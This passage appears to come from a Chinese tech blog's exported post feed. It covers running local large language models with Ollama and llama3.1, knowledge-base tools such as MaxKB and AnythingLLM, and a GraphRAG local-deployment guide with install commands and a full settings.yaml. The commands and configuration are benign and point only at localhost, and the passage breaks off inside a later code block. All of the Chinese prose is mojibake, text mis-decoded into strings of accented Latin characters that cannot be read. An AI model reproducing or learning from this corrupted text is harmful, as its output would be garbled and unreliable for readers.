è¿œç¨‹ä¸»æœºçš„é˜²ç«å¢™é…ç½®ã€‚</p></li></ul><p> <img src="/img/AI_project/models/data.png"></p><p>å¦‚æœä½ æˆåŠŸï¼Œæ­å–œä½ ï¼ç°åœ¨ä½ å¯ä»¥ä¸è‡ªå·±çš„å¤§æ¨¡å‹è¿›è¡Œäº¤äº’å•¦<br> <img src="/img/AI_project/models/models.png"></p><p>å…³äºæœ¬åœ°éƒ¨ç½²LLaMA3å’Œæ¨¡å‹å¾®è°ƒçš„å…·ä½“æ“ä½œå¯å‚è€ƒ<a href="https://www.bilibili.com/video/BV1uw4m1S7Cd/?spm_id_from=333.337.search-card.all.click">è¯¥è§†é¢‘</a><br>å…³äºæ•°æ®é›†çš„æ ¼å¼å’Œå†…å®¹ï¼Œç¬”è€…åœ¨é¡¹ç›®è¿‡ç¨‹ä¸­ä¹Ÿé‡åˆ°äº†æ•°æ®æ¥æºåŒ®ä¹ã€æ•°æ®è´¨é‡ä¸é«˜ç­‰ä¸€ç³»åˆ—å¤æ‚é—®é¢˜ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒèŒƒä¾‹å’Œæœ€ç»ˆæ•ˆæœå±•ç¤º<br><img src="/img/AI_project/models/demo.png"></p><h2 id="å¤§æ¨¡å‹ç»“åˆçŸ¥è¯†å›¾è°±"><a href="#å¤§æ¨¡å‹ç»“åˆçŸ¥è¯†å›¾è°±" class="headerlink" title="å¤§æ¨¡å‹ç»“åˆçŸ¥è¯†å›¾è°±"></a>å¤§æ¨¡å‹ç»“åˆçŸ¥è¯†å›¾è°±</h2><h3 id="1-Maxkb-ollamaæ‰“é€ æœ¬åœ°çŸ¥è¯†åº“"><a href="#1-Maxkb-ollamaæ‰“é€ æœ¬åœ°çŸ¥è¯†åº“" class="headerlink" title="1.Maxkb+ollamaæ‰“é€ æœ¬åœ°çŸ¥è¯†åº“"></a>1.<strong>Maxkb+ollamaæ‰“é€ æœ¬åœ°çŸ¥è¯†åº“</strong></h3><p>å…·ä½“æ–¹æ³•å¯å‚è€ƒ<a href="https://www.bilibili.com/video/BV1an4y1R7HT/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">è¯¥è§†é¢‘</a><br>ä»¥åŠ<a href="https://maxkb.cn/docs/">Maxkbæ“ä½œæ‰‹å†Œ</a><br><img src="/img/AI_project/models/maxkb.png"><br>æ•ˆæœå¦‚ä¸‹<br><img src="/img/AI_project/models/maxkb-1.png"></p><h3 id="2-AnythingLLM-Ollama"><a href="#2-AnythingLLM-Ollama" class="headerlink" title="2.AnythingLLM+Ollama"></a>2.<strong>AnythingLLM+Ollama</strong></h3><p>å…·ä½“æ–¹æ³•å¯å‚è€ƒ<a href="https://www.bilibili.com/video/BV1FXHze4Ew7/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">è¯¥è§†é¢‘</a><br>ä»¥åŠ<a href="https://anythingllm.com/download">anythingLLAå®˜ç½‘</a><br><img src="/img/AI_project/models/anythingLLA.png"><br>æ•ˆæœå¦‚ä¸‹<br><img src="/img/AI_project/models/anythingLLA-1.png"><br>AnythingLLAå°†æä¾›çš„æ–‡æœ¬æ–‡æ¡£å‘é‡åŒ–å­˜å‚¨åœ¨æ­¤å²¸è¿æ•°æ®åº“ä¸­ï¼Œè°ƒç”¨æ—¶å°†ä¼šæ£€ç´¢å‘é‡æ•°æ®åº“å¹¶é€šè¿‡é“¾æ¥æˆè‡ªç„¶è¯­è¨€è¿”å›ç»™ç”¨æˆ·</p><h3 id="3-Langchain-llama"><a href="#3-Langchain-llama" class="headerlink" title="3.Langchain+llama"></a>3.<strong>Langchain+llama</strong></h3><p>å…·ä½“æ–¹æ³•å¯å‚è€ƒ<a href="https://www.bilibili.com/video/BV1t8411y7fp/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">è¯¥è§†é¢‘</a></p><hr><p><strong>åè®°</strong></p><p>è¯¥é¡¹ç›®å¯åŠ¨äº2024å¹´ä¸ƒæœˆä¸­ä¸‹æ—¬ï¼Œä¾ç¨€è®°å¾—åœ¨é‚£ä¸ªç‚çƒ­çš„æš‘å‡ï¼Œæˆ‘æ€€ç€ç‚½çƒ­çš„å¿ƒï¼Œæ»¡æ€€æ¿€æƒ…åœ°è¿›å…¥äº†é¡¹ç›®ç»„ï¼ŒæœŸå¾…ç€å’Œå­¦é•¿å­¦å§ä¸€èµ·åœ¨é¡¹ç›®ä¸­å­¦ä¹ æˆé•¿ã€‚<br>ä»æœ€åˆæ­å»ºfayæ¡†æ¶çš„æ•°å­—äººï¼Œåˆ°ç«‹é¡¹æœ‰æ˜ç¡®çš„ä»»åŠ¡åˆ†å·¥ï¼Œå†åˆ°æŠ€æœ¯è·¯çº¿çš„è°ƒç ”ï¼Œæ¨¡å‹çš„é€‰å‹ã€éƒ¨ç½²å’Œå¾®è°ƒï¼Œä¸€æ­¥ä¸€æ­¥èµ°è¿‡æ¥ï¼Œæˆ‘æ”¶è·äº†å¾ˆå¤šå¾ˆå¤šï¼Œä¸ä»…ä»…æœ‰æœªçŸ¥çš„çŸ¥è¯†å’ŒæŠ€èƒ½ï¼Œè¿˜æœ‰æ·±åšçš„æ„Ÿæƒ…å’Œç‹¬ç‰¹çš„ä½“éªŒã€‚åœ¨æ­¤ç‰¹åˆ«æ„Ÿè°¢é™ˆé™¢é•¿ç»™äºˆçš„å®è´µæœºä¼šï¼Œæ„Ÿè°¢ç™½å­¦å§ç»™æˆ‘æŒ‡å¯¼å’Œå¸®åŠ©ï¼Œæ„Ÿè°¢å°ä¼™ä¼´çš„é™ªä¼´ã€‚è¿™æ˜¯ä¸€æ®µæµ…æµ…çš„ç§‘ç ”ä½“éªŒï¼Œä¹Ÿæ˜¯ä¸€æ®µéå¸¸ç‹¬ç‰¹çš„äººç”Ÿä½“éªŒï¼Œå¥½ä¼¼åœ¨æˆ‘å¹³å‡¡çš„æš‘å‡ç”Ÿæ´»ä¸­ç‚¹äº®äº†ä¸€ç›ç¯ï¼ŒæŒ‡å¼•ç€æˆ‘å‰è¿›ã€‚æœ€åï¼Œå†æ¬¡è¡·å¿ƒæ„Ÿè°¢è¿™ä¸‰ä¸ªæœˆä»¥æ¥è€å¸ˆã€å­¦å§å’Œå°ä¼™ä¼´çš„æ”¯æŒä¸é™ªä¼´ï¼</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llama3 </tag>
            
            <tag> ChatGLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŸ¥è¯†å›¾è°±</title>
      <link href="/2024/10/10/Summary/"/>
      <url>/2024/10/10/Summary/</url>
      
        <content type="html"><![CDATA[<h1 id="å·¥ä½œæ€»ç»“"><a href="#å·¥ä½œæ€»ç»“" class="headerlink" title="å·¥ä½œæ€»ç»“"></a>å·¥ä½œæ€»ç»“</h1><ul><li><a href="#%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93">å·¥ä½œæ€»ç»“</a><ul><li><a href="#1graphrag%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.GraphRAGæœ¬åœ°éƒ¨ç½²</a><ul><li><a href="#11%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE">1.1åŸºç¡€é…ç½®</a></li><li><a href="#12%E4%BD%BF%E7%94%A8ollamallama%E8%BF%9B%E8%A1%8C%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.2ä½¿ç”¨Ollama+llamaè¿›è¡Œæœ¬åœ°éƒ¨ç½²</a></li><li><a href="#13%E4%BD%BF%E7%94%A8deepseek%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%BF%9B%E8%A1%8C%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.3ä½¿ç”¨deepseekå¤§æ¨¡å‹è¿›è¡Œæœ¬åœ°éƒ¨ç½²</a></li><li><a href="#14-%E5%AF%B9graphrag%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90">1.4 å¯¹GraphRAGçš„å·¥ä½œæµç¨‹ç®€å•åˆ†æ</a></li></ul></li><li><a href="#2-neo4j%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1">2. Neo4jå¯è§†åŒ–çŸ¥è¯†å›¾è°±</a><ul><li><a href="#21-neo4j%E9%83%A8%E7%BD%B2">2.1 Neo4jéƒ¨ç½²</a></li><li><a href="#22-%E5%B0%86graphrag%E8%BF%9B%E8%A1%8C%E5%8F%AF%E8%A7%86%E5%8C%96%E6%93%8D%E4%BD%9C">2.2 å°†GraphRAGè¿›è¡Œå¯è§†åŒ–æ“ä½œ</a></li><li><a href="#23-%E8%87%AA%E8%A1%8C%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95%E5%9B%BE%E8%B0%B1%E7%A4%BA%E4%BE%8B">2.3 è‡ªè¡Œåˆ›å»ºç®€å•å›¾è°±ç¤ºä¾‹</a></li><li><a href="#24-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">2.4 çŸ¥è¯†å›¾è°±æ„å»ºæ¡ˆä¾‹åˆ†æ</a><ul><li><a href="#241-%E7%BA%A2%E6%A5%BC%E6%A2%A6%E4%BA%BA%E7%89%A9%E5%85%B3%E7%B3%BB%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.1 çº¢æ¥¼æ¢¦äººç‰©å…³ç³»å›¾è°±æ„å»º</a></li><li><a href="#242-%E5%80%9F%E5%8A%A9ai%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%BF%9B%E8%A1%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.2 å€ŸåŠ©AIå¤§æ¨¡å‹è¿›è¡ŒçŸ¥è¯†å›¾è°±æ„å»º</a></li><li><a href="#243-%E5%8C%BB%E7%96%97%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.3 åŒ»ç–—çŸ¥è¯†å›¾è°±æ„å»º</a></li></ul></li></ul></li></ul></li></ul><h2 id="1-GraphRAGæœ¬åœ°éƒ¨ç½²"><a href="#1-GraphRAGæœ¬åœ°éƒ¨ç½²" class="headerlink" title="1.GraphRAGæœ¬åœ°éƒ¨ç½²"></a>1.GraphRAGæœ¬åœ°éƒ¨ç½²</h2><p>è‹¥æœ‰OpenAIå¯†é’¥å¯ç›´æ¥æŒ‰ç…§<a href="https://microsoft.github.io/graphrag/posts/get_started/">graphragå®˜ç½‘</a>çš„æ­¥éª¤è¿›è¡Œgraphragçš„æœ¬åœ°éƒ¨ç½²å’Œä½¿ç”¨<br>ä¸€èˆ¬ç”¨æˆ·æ²¡æœ‰OpenAIå¯†é’¥å¯ä»¥è€ƒè™‘ä½¿ç”¨å…¶ä»–å¯è·å¾—çš„å¯†é’¥æˆ–è€…ç”¨Ollama+llamaè¿›è¡Œæœ¬åœ°å¤§æ¨¡å‹éƒ¨ç½²ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æœ¬åœ°å¤§æ¨¡å‹éƒ¨ç½²å¯¹ç”µè„‘é…ç½®è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå»ºè®®è¿˜æ˜¯ä½¿ç”¨apiæ¥å£  </p><p>ä»¥ä¸‹è®²è§£GraphRAGåœ¨ä¸ç”¨OpenAIå¯†é’¥çš„æƒ…å†µä¸‹çš„éƒ¨ç½²</p><h3 id="1-1åŸºç¡€é…ç½®"><a href="#1-1åŸºç¡€é…ç½®" class="headerlink" title="1.1åŸºç¡€é…ç½®"></a>1.1åŸºç¡€é…ç½®</h3><p>åˆ›å»ºé¡¹ç›®graphragï¼ˆä¹Ÿå¯ä»¥å–å…¶ä»–åç§°ï¼Œè¿™é‡Œæ–¹ä¾¿åç»­è¯´æ˜ï¼‰åŠç›¸åº”è™šæ‹Ÿç¯å¢ƒï¼Œæ³¨æ„pythonç‰ˆæœ¬ä¸º<strong>3.10-3.12</strong><br>å®‰è£…graphragåº“:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphrag</span><br></pre></td></tr></table></figure><p>åˆ›å»ºç›®å½•testï¼ˆä¹Ÿå¯ä»¥æ˜¯å…¶ä»–åç§°ï¼Œè¿™é‡Œç¡®å®šä¸ºtestæ–¹ä¾¿åç»­è¯´æ˜ï¼‰<br>åœ¨testç›®å½•ä¸‹åˆ›å»ºç›®å½•inputï¼Œåœ¨inputç›®å½•ä¸‹å­˜æ”¾è¦è¿›è¡Œç´¢å¼•æ„å»ºçš„æ–‡æœ¬æ–‡ä»¶<br>å®Œæˆåå½“å‰æ–‡ä»¶æ ‘ç»“æ„ä¸º:  </p><pre><code>graphrag    â””â”€test        â””â”€input            â””â”€book.txt</code></pre><p>åˆå§‹åŒ–testç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --init --root ./test</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–æ—¶ä¼šç”Ÿæˆå…¶ä»–æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œå®Œæˆåå½“å‰æ–‡ä»¶æ ‘ç»“æ„ä¸º:  </p><pre><code>graphrag    â””â”€test        â”‚  .env        â”‚  settings.yaml        â”‚        â”œâ”€input        â”‚      book.txt        â”‚        â”œâ”€output        â”‚  â””â”€20240914-170402        â”‚      â””â”€reports        â”‚              indexing-engine.log        â”‚        â””â”€prompts                claim_extraction.txt                community_report.txt                entity_extraction.txt                summarize_descriptions.txt</code></pre><p>è‡³æ­¤ï¼ŒåŸºæœ¬é…ç½®ç»“æŸ</p><h3 id="1-2ä½¿ç”¨Ollama-llamaè¿›è¡Œæœ¬åœ°éƒ¨ç½²"><a href="#1-2ä½¿ç”¨Ollama-llamaè¿›è¡Œæœ¬åœ°éƒ¨ç½²" class="headerlink" title="1.2ä½¿ç”¨Ollama+llamaè¿›è¡Œæœ¬åœ°éƒ¨ç½²"></a>1.2ä½¿ç”¨Ollama+llamaè¿›è¡Œæœ¬åœ°éƒ¨ç½²</h3><p>å¯ä»¥å‚è€ƒ<a href="https://www.bilibili.com/video/BV18HeFetELw/?spm_id_from=333.337.search-card.all.click&vd_source=4966528acd6540678eedd7b9e188a2d1">bç«™è§†é¢‘</a><br>ç¬”è€…ä¹Ÿæ˜¯é€šè¿‡è¯¥è§†é¢‘å®Œæˆäº†Ollama+llamaæœ¬åœ°éƒ¨ç½²graphrag<br>Ollamaå®˜ç½‘:<a href="https://ollama.com/">https://ollama.com/</a>  </p><p><strong>Ollamaç›¸å…³å‘½ä»¤</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama pull llama3.1 <span class="comment"># æ‹‰å–æ¨¡å‹</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run llama3.1 <span class="comment"># è¿è¡Œæ¨¡å‹</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama serve <span class="comment"># å¼€å¯æœåŠ¡</span></span><br></pre></td></tr></table></figure><p><em><strong>ç›¸å…³æ–‡ä»¶</strong></em><br>è¯¥è§†é¢‘å·²ç»™å‡º<a href="https://pan.baidu.com/s/1li35HD80IulxJntWcI9DFw?pwd=s53j">æ–‡ä»¶ç™¾åº¦ç½‘ç›˜ä¸‹è½½åœ°å€</a>ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶ç²˜è´´æ­¤å¤„å·²ä¸‹å¥½çš„æ–‡ä»¶å†…å®¹</p><p>settings.yaml:  </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encoding_model:</span> <span class="string">cl100k_base</span></span><br><span class="line"><span class="attr">skip_workflows:</span> []</span><br><span class="line"><span class="attr">llm:</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">sk-djdjsjdj</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">openai_chat</span> <span class="comment"># or azure_openai_chat</span></span><br><span class="line">  <span class="comment">#model: glm4:9b-chat-q6_K</span></span><br><span class="line">  <span class="attr">model:</span> <span class="string">llama3.1</span></span><br><span class="line">  <span class="attr">model_supports_json:</span> <span class="literal">true</span> <span class="comment"># recommended if this is available for your model.</span></span><br><span class="line">  <span class="comment"># max_tokens: 4000</span></span><br><span class="line">  <span class="comment"># request_timeout: 180.0</span></span><br><span class="line">  <span class="attr">api_base:</span> <span class="string">http://localhost:11434/v1</span></span><br><span class="line">  <span class="comment"># api_version: 2024-02-15-preview</span></span><br><span class="line">  <span class="comment"># organization: &lt;organization_id&gt;</span></span><br><span class="line">  <span class="comment"># deployment_name: &lt;azure_model_deployment_name&gt;</span></span><br><span class="line">  <span class="comment"># tokens_per_minute: 150_000 # set a leaky bucket throttle</span></span><br><span class="line">  <span class="comment"># requests_per_minute: 10_000 # set a leaky bucket throttle</span></span><br><span class="line">  <span class="comment"># max_retries: 10</span></span><br><span class="line">  <span class="comment"># max_retry_wait: 10.0</span></span><br><span class="line">  <span class="comment"># sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span></span><br><span class="line">  <span class="comment"># concurrent_requests: 25 # the number of parallel inflight requests that may be made</span></span><br><span class="line"></span><br><span class="line"><span class="attr">parallelization:</span></span><br><span class="line">  <span class="attr">stagger:</span> <span class="number">0.3</span></span><br><span class="line">  <span class="comment"># num_threads: 50 # the number of threads to use for parallel processing</span></span><br><span class="line"></span><br><span class="line"><span class="attr">async_mode:</span> <span class="string">threaded</span> <span class="comment"># or asyncio</span></span><br><span class="line"></span><br><span class="line"><span class="attr">embeddings:</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for embeddings</span></span><br><span class="line">  <span class="attr">async_mode:</span> <span class="string">threaded</span> <span class="comment"># or asyncio</span></span><br><span class="line">  <span class="attr">llm:</span></span><br><span class="line">    <span class="attr">api_key:</span> <span class="string">sk-djdjsjdj</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">openai_embedding</span> <span class="comment"># or azure_openai_embedding</span></span><br><span class="line">    <span class="attr">model:</span> <span class="string">nomic-embed-text</span></span><br><span class="line">    <span class="comment">#model: nomic_embed_text</span></span><br><span class="line">    <span class="attr">api_base:</span> <span class="string">http://localhost:11434/api</span></span><br><span class="line">    <span class="comment">#api_base: http://localhost:11434/v1</span></span><br><span class="line">    <span class="comment"># api_version: 2024-02-15-preview</span></span><br><span class="line">    <span class="comment"># organization: &lt;organization_id&gt;</span></span><br><span class="line">    <span class="comment"># deployment_name: &lt;azure_model_deployment_name&gt;</span></span><br><span class="line">    <span class="comment"># tokens_per_minute: 150_000 # set a leaky bucket throttle</span></span><br><span class="line">    <span class="comment"># requests_per_minute: 10_000 # set a leaky bucket throttle</span></span><br><span class="line">    <span class="comment"># max_retries: 10</span></span><br><span class="line">    <span class="comment"># max_retry_wait: 10.0</span></span><br><span class="line">    <span class="comment"># sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span></span><br><span class="line">    <span class="comment"># concurrent_requests: 25 # the number of parallel inflight requests that may be made</span></span><br><span class="line">    <span class="comment"># batch_size: 16 # the number of documents to send in a single request</span></span><br><span class="line">    <span class="comment"># batch_max_tokens: 8191 # the maximum number of tokens to send in a single request</span></span><br><span class="line">    <span class="comment"># target: required # or optional</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">chunks:</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">overlap:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">group_by_columns:</span> [<span class="string">id</span>] <span class="comment"># by default, we don&#x27;t allow chunks to cross documents</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">input:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">file_type:</span> <span class="string">text</span> <span class="comment"># or csv</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;input&quot;</span></span><br><span class="line">  <span class="attr">file_encoding:</span> <span class="string">utf-8</span></span><br><span class="line">  <span class="attr">file_pattern:</span> <span class="string">&quot;.*\\.txt$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;cache&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">storage:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;output/$&#123;timestamp&#125;/artifacts&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reporting:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or console, blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;output/$&#123;timestamp&#125;/reports&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">entity_extraction:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/entity_extraction.txt&quot;</span></span><br><span class="line">  <span class="attr">entity_types:</span> [<span class="string">organization</span>,<span class="string">person</span>,<span class="string">geo</span>,<span class="string">event</span>]</span><br><span class="line">  <span class="attr">max_gleanings:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">summarize_descriptions:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/summarize_descriptions.txt&quot;</span></span><br><span class="line">  <span class="attr">max_length:</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="attr">claim_extraction:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="comment"># enabled: true</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/claim_extraction.txt&quot;</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;Any claims or facts that could be relevant to information discovery.&quot;</span></span><br><span class="line">  <span class="attr">max_gleanings:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">community_report:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/community_report.txt&quot;</span></span><br><span class="line">  <span class="attr">max_length:</span> <span class="number">2000</span></span><br><span class="line">  <span class="attr">max_input_length:</span> <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cluster_graph:</span></span><br><span class="line">  <span class="attr">max_cluster_size:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">embed_graph:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">false</span> <span class="comment"># if true, will generate node2vec embeddings for nodes</span></span><br><span class="line">  <span class="comment"># num_walks: 10</span></span><br><span class="line">  <span class="comment"># walk_length: 40</span></span><br><span class="line">  <span class="comment"># window_size: 2</span></span><br><span class="line">  <span class="comment"># iterations: 3</span></span><br><span class="line">  <span class="comment"># random_seed: 597832</span></span><br><span class="line"></span><br><span class="line"><span class="attr">umap:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">false</span> <span class="comment"># if true, will generate UMAP embeddings for nodes</span></span><br><span class="line"></span><br><span class="line"><span class="attr">snapshots:</span></span><br><span class="line">  <span class="attr">graphml:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">raw_entities:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">top_level_nodes:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="comment"># text_unit_prop: 0.5</span></span><br><span class="line">  <span class="comment"># community_prop: 0.1</span></span><br><span class="line">  <span class="comment"># conversation_history_max_turns: 5</span></span><br><span class="line">  <span class="comment"># top_k_mapped_entities: 10</span></span><br><span class="line">  <span class="comment"># top_k_relationships: 10</span></span><br><span class="line">  <span class="comment"># max_tokens: 12000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">global_search:</span></span><br><span class="line">  <span class="comment"># max_tokens: 12000</span></span><br><span class="line">  <span class="comment"># data_max_tokens: 12000</span></span><br><span class="line">  <span class="comment"># map_max_tokens: 1000</span></span><br><span class="line">  <span class="comment"># reduce_max_tokens: 2000</span></span><br><span class="line">  <span class="comment"># concurrency: 32</span></span><br></pre></td></tr></table></figure><p>community_report.txt:  </p><figure class="highlight txt"><table><tr><td 